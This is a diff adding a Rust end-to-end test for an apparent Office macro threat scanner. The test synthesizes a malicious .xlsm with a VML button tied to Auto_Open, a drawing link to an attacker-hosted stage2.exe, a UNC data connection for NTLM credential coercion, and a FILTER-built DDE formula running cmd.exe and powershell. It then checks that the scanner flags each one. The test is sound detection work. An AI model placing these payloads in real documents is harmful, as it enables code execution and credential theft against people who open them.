@@ -2865,3 +2865,141 @@ fn e2e_package_threats_printer_settings_custom_xml_and_protocols() {
         "SARIF must contain VBA-CELL-017 rule"
     );
 }
+
+#[test]
+fn e2e_drawing_actions_data_connections_and_filter_sort() {
+    let src = "Attribute VB_Name = \"ThisWorkbook\"\nSub CleanProc()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "DrawConnProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["CleanProc"],
+    );
+
+    // 1. Synthesize xl/drawings/vmlDrawing1.vml with form control linking to Auto_Open
+    let vml_drawing = b"<xml><v:shape id=\"Button1\"><x:ClientData><x:FmlaMacro>Auto_Open</x:FmlaMacro></x:ClientData></v:shape></xml>";
+
+    // 2. Synthesize xl/drawings/_rels/drawing1.xml.rels targeting executable payload
+    let drawing_rels = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
+<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">
+  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" Target=\"http://attacker.com/stage2.exe\" TargetMode=\"External\"/>
+</Relationships>";
+
+    // 3. Synthesize xl/connections.xml with UNC path NTLM coercion
+    let connections_xml = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
+<connections xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">
+  <connection id=\"1\" name=\"EvilConn\" type=\"1\" connection=\"OLEDB;Provider=SQLOLEDB;Data Source=\\\\192.168.1.100\\share;Initial Catalog=evil;\"/>
+</connections>";
+
+    // 4. Sheet1 with dynamic array FILTER formula assembling DDE payload
+    let sheet1_xml = b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
+<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">
+  <sheetData>
+    <row r=\"1\">
+      <c r=\"A1\" t=\"inlineStr\"><is><t>powershell.exe</t></is></c>
+      <c r=\"B1\" t=\"n\"><v>1</v></c>
+      <c r=\"C1\"><f>\"cmd.exe|'/c \" &amp; INDEX(FILTER(A1:A2, B1:B2), 1, 1) &amp; \"'!A0\"</f></c>
+    </row>
+    <row r=\"2\">
+      <c r=\"A2\" t=\"inlineStr\"><is><t>notepad.exe</t></is></c>
+      <c r=\"B2\" t=\"n\"><v>0</v></c>
+    </row>
+  </sheetData>
+</worksheet>";
+
+    let xlsm = synthesize_zip(&[
+        (
+            "[Content_Types].xml",
+            b"<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"></Types>",
+        ),
+        (
+            "_rels/.rels",
+            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
+<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
+</Relationships>",
+        ),
+        (
+            "xl/workbook.xml",
+            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
+<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\
+  <sheets>\
+    <sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/>\
+  </sheets>\
+</workbook>",
+        ),
+        (
+            "xl/_rels/workbook.xml.rels",
+            b"<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\
+<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+  <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+  <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+</Relationships>",
+        ),
+        ("xl/vbaProject.bin", &cfb),
+        ("xl/worksheets/sheet1.xml", sheet1_xml),
+        ("xl/drawings/vmlDrawing1.vml", vml_drawing),
+        ("xl/drawings/_rels/drawing1.xml.rels", drawing_rels),
+        ("xl/connections.xml", connections_xml),
+    ]);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify SuspiciousDrawingAction (VBA-CELL-018) for VML macro and relationship
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousDrawingAction"
+                && t.description.contains("Auto_Open")),
+        "Should detect VML drawing macro action: {threats:?}"
+    );
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SuspiciousDrawingAction"
+                && t.description.contains("stage2.exe")),
+        "Should detect drawing relationship targeting executable: {threats:?}"
+    );
+
+    // 2. Verify ExternalDataConnection (VBA-CELL-019) for UNC NTLM coercion
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "ExternalDataConnection"
+                && t.description.contains("NTLM credential coercion")),
+        "Should detect external data connection UNC NTLM coercion: {threats:?}"
+    );
+
+    // 3. Verify C1: DDE formula de-obfuscated via dynamic array FILTER
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DDE"
+            && t.description.contains("cmd.exe|'/c powershell.exe'!A0")),
+        "C1 should resolve DDE via FILTER evaluation: {threats:?}"
+    );
+
+    // 4. Verify SARIF output contains VBA-CELL-018 and VBA-CELL-019
+    let sarif = inspection_to_sarif(&inspection, "file:///test/drawing_connections.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-018"),
+        "SARIF must contain VBA-CELL-018 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-019"),
+        "SARIF must contain VBA-CELL-019 rule"
+    );
+
+    // 5. Verify JSON output contains rule_id VBA-CELL-018 and VBA-CELL-019
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-018\""),
+        "JSON missing VBA-CELL-018"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-019\""),
+        "JSON missing VBA-CELL-019"
+    );
+}
